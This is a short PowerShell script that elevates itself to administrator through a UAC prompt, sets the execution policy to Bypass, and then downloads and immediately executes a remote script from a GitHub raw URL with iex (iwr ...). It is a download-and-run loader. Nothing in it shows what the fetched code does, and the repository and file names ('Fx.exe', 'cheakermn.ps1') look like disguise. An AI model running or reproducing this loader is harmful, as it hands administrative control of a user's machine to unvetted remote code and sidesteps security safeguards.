$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-NOT $isAdmin) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -NoExit -Command `"& '$PSCommandPath'`""
    Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
    exit
}

Set-ExecutionPolicy Bypass -Scope Process -Force
iex (iwr 'https://github.com/kilordow/Fx.exe/raw/refs/heads/main/cheakermn.ps1' -UseBasicParsing).Content

Start-Sleep -Seconds 5
